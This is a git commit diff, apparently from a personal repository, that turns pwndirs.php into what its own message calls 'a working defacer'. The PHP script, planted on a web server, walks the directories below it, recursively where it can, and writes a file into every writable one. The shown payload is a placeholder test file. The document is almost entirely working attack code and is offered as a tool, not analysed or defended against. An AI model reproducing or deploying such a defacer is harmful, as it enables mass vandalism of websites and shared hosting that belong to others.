9b85cf041bb4940da83f68addacaa79f2e84b775
WSTNPHX <info@sctn9.com>
2018-04-23 13:58:02 -0700

    now it's a working defacer

--- pwndirs.php
+++ pwndirs.php
@@ -1,69 +1,78 @@
 <?php
 
 # pwndirs.php - Mass defacer. What?
-# v. 2018-04-19
+# VVestron Phoronix
+
+
+# Defines
+##
 
 define('DS','/');
+
+
+# Variables
+##
+
+$old_php = '';
+$dir = current_dir();
+$paths = array($dir);
+$pwn_name = 'test.txt';
+$pwn_content = 'This is a test.';
+
 
 # Functions
 ##
 
 # Find current dir based on PHP ver
 function current_dir() {
-    $vers[0] = '1';
-    $vers[1] = '1';
+    global $old_php;
+
+    $php_ver[0] = "1";
+    $php_ver[1] = "1";
 
     if ( function_exists('phpversion') ) {
-        $vers = explode('.', substr(phpversion(), 0, 3));
+        $php_ver = explode( '.', substr(phpversion(), 0, 3) );
     }
 
-    if ($vers[0] <= 5) {
-        if ($vers[1] <= 3) {
+    if ($php_ver[0] <= "5") {
+        if ($php_ver[1] <= "3") {
+            $old_php = "1";
             $cur_dir = dirname(__FILE__);
         }
     } else {
         $cur_dir = __DIR__;
     }
-    return $cur_dir;
+
+    return realpath($cur_dir);
 }
 
-# Variables
-##
-
-$dir = current_dir();
-$files_array = scandir($dir);
-$root_array = scandir('/');
-$dirs_array = [];
-$file_name = 'test.txt';
-$file_content = 'This is a test.';
 
 # Main
 ##
 
-# Find writable dirs below __DIR__
-foreach ($files_array as $file) {
-    $dirs_path = $dir . DS . $file;
+if ($old_php) {
+    # Find dirs directly below __DIR__
+    $files_array = array_diff( scandir($dir), array('..', '.') );
 
-    if ($file === '.' or $file === '..') {
-        continue;
-    } elseif ( is_dir($dirs_path) ) {
-        if ( is_writable($dirs_path) ) {
-            array_push($dirs_array, $dirs_path);
+    foreach ($files_array as $old_file) {
+        $dirs_path = $dir . DS . $old_file;
+        if ( is_dir($dirs_path) ) {
+            if ( is_writable($dirs_path) ) {
+                array_push($paths, $dirs_path);
+            }
         }
     }
-}
+} else {
+    # Find dirs recursively below __DIR__
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST,
+        RecursiveIteratorIterator::CATCH_GET_CHILD // Ignore "Permission denied"
+    );
 
-# Find writable dirs a level below root
-if ( isset($_GET['root']) && $_GET['root'] === '1' ) {
-    foreach ($root_array as $file) {
-        $dirs_path = DS . $file;
-
-        if ($file === '.' or $file === '..' or $file === 'lost+found') {
-            continue;
-        } elseif ( is_dir($dirs_path) ) {
-            if ( is_writable($dirs_path) ) {
-                array_push($dirs_array, $dirs_path);
-            }
+    foreach ($iterator as $path => $file) {
+        if ( $file->isDir() ) {
+            $paths[] = $path;
         }
     }
 }
@@ -71,10 +80,12 @@ if ( isset($_GET['root']) && $_GET['root'] === '1' ) {
 # Scribble
 if ( function_exists('file_put_contents') ) {
     echo "<!doctype html>\n<html lang=en>\n<title>.</title>\n<body>\n";
-    foreach ($dirs_array as $pwned) {
-        $file = $pwned . DS . $file_name;
-        if ( file_put_contents($file, $file_content) ) {
-            echo "Wrote to $file<br>\n";
+    foreach ($paths as $pwned) {
+        $pwn_file = $pwned . DS . $pwn_name;
+        if ( is_writable($pwned) ) {
+            if ( file_put_contents($pwn_file, $pwn_content) ) {
+                echo "Wrote to $pwn_file<br>\n";
+            }
         }
     }
 }
